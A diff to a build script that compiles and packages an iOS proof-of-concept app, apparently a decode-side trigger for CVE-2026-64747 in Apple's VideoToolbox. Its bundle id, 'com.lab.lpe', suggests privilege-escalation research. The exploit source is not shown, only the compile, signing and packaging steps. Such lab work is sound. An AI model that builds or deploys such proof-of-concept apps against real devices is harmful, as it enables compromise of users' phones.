@@ -234,3 +234,34 @@ cd dist5
 zip -q -r -X CGPOC.ipa Payload/CGPOC.app
 cd ..
 echo "[+] built dist5/CGPOC.ipa"
+
+# ---- CVE-2026-64747 DECODE-side trigger (the encoder route needs a 12.9 GB
+#      client-side pixel buffer; the decoder gets its size from the bitstream) --
+APP10="dist5/Payload/VTDEC.app"
+mkdir -p "$APP10"
+$CC -x objective-c -O0 -g -o "$APP10/VTDEC" vtdec_poc.c \
+    -framework Foundation -framework VideoToolbox -framework CoreMedia -framework CoreVideo
+cat > "$APP10/Info.plist" <<PLIST10
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+  <key>CFBundleExecutable</key><string>VTDEC</string>
+  <key>CFBundleIdentifier</key><string>com.lab.lpe</string>
+  <key>CFBundleName</key><string>VTDEC</string>
+  <key>CFBundleVersion</key><string>1.0</string>
+  <key>CFBundleShortVersionString</key><string>1.0</string>
+  <key>CFBundlePackageType</key><string>APPL</string>
+  <key>LSRequiresIPhoneOS</key><true/>
+  <key>MinimumOSVersion</key><string>16.0</string>
+  <key>UIDeviceFamily</key><array><integer>1</integer></array>
+  <key>UILaunchScreen</key><dict/>
+</dict>
+</plist>
+PLIST10
+codesign -s - --force "$APP10/VTDEC" 2>/dev/null || true
+rm -f dist5/VTDEC.ipa
+cd dist5
+zip -q -r -X VTDEC.ipa Payload/VTDEC.app
+cd ..
+echo "[+] built dist5/VTDEC.ipa"
